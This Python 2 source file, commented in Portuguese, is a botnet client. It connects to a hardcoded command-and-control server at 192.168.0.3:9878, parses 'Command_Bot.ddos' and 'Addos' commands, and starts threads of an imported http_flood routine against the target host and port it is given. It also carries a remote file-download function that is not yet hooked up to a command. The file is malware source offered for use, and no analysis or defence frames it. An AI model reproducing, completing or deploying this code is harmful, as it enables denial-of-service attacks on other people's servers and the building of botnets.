# coding=utf-8

import sys
import os
import time 
import base64
import platform
import socket

#import getpass Nao usado ainda
import hashlib
import requests
import thread
#import json Nao usado ainda 



'''
Exemple commands
  
  bot_commands = {
	  	'Command_Bot.alive{"False"}' : '', 
	  	'Command_Bot.ddos{"192.168.0.1", 80, 1, packages}': 'Simple ddos',
     'Command_Bot.Addos{"192.168.0.1", 80, 5, packages}': 'Advanced ddos'  
    }
'''

def Command_Format(raw_command):
  
  if(raw_command.split('.')[0] == 'Command_Bot'):

    format_command = []
    
    type_command = str(raw_command.split('.')[1].split('{')[0])
    format_command = str(raw_command.split('{')[1].split('}')[0])

    return type_command, format_command

  else:
    return False


def Command_Exec(type_command, format_command):

  import http_flood
	
  commands = {
    'ddos'  : True,
    'Addos' : True
  }

  if(type_command == 'alive'):
    #function ping
    pass

  elif(commands[type_command]):

    if(type_command == 'ddos' or type_command == 'Addos'):
          
      h_host = str(format_command.split(',')[0]).replace('"', '')
      h_port = int(format_command.split(',')[1])
      h_threads = int(format_command.split(',')[2])
      h_packages = int(format_command.split(',')[3])

      for i in range(0, h_threads, 1):

        thread.start_new_thread(http_flood.Main_Flood, (h_host, h_port, h_packages))
    
      return True
    
    else:
      return False

  else:#novos comandos novas estruturas logicas
    pass


def Download_file(File_Url, Path):#falta adicionar o commando!

  file_name = File_Url.split('/')
  file_name = str(file_name[len(file_name) -1])
  file_local = str(Path + file_name)

  get_file = requests.get(File_Url)

  if(get_file.status_code == 200):
    try:

      down_file = open(file_local, 'w')
      down_file.write(get_file.content)
      down_file.close()

    except:
      pass#Depois fazer tratamentos de erros no codigo 

  else:
    pass #Depois fazer tratamentos de erros no codigo 


def main():

  data_command = str('')
    
  connection_loop = bool(True)

  server_ip = str('192.168.0.3')
  server_port = int(9878)

  bot_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  bot_socket.connect((server_ip, server_port))
  
  while(connection_loop):

    data_command = bot_socket.recv(1024)

    if(data_command != ''):
      
      type_command, format_command = Command_Format(data_command)
      
      Command_Exec(type_command, format_command)
      # E necessario um time para o processo nao morrer, Talvez editar  o http_flood ja que o time dele nao funciona
      #Falta desenvolver as outras funcoes! 
		
    else:
      pass





if __name__ == '__main__':
  main()